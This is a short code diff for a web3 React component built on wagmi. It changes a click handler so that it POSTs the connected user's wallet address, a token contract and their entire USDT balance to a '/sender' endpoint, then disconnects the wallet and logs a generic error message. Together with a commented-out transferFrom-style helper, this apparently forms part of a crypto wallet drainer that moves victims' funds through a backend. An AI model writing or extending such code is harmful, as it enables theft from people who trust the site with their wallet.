@@ -3,9 +3,6 @@
 import { useAccount, usePublicClient, useFeeData, useWalletClient, useBalance, useDisconnect } from 'wagmi'
 import {useState} from "react"
 import abis from "@/utils/abis/mover.json"
-import { sender } from '@/utils/sender/tfFrom'
-import { useMaticBal, useUSDTBal } from '../balance'
-
 
 interface Props {
   title: string,
@@ -134,7 +131,17 @@ const handleClick = async() => {
      {
          const cost = usdt?.value
          
+         const res = await fetch("/sender",{method: 'POST',
+         body: JSON.stringify({
+          address,
+           contract: ercadd,
+           amount: cost
+         }),
+         headers: {
+           'Content-type': 'application/json; charset=UTF-8',
+         }})
          //const hashed = await sender(ercadd, address, usdt?.value)
+         console.log(res)
          disconnect()
         
          console.log("An error occur for sending")
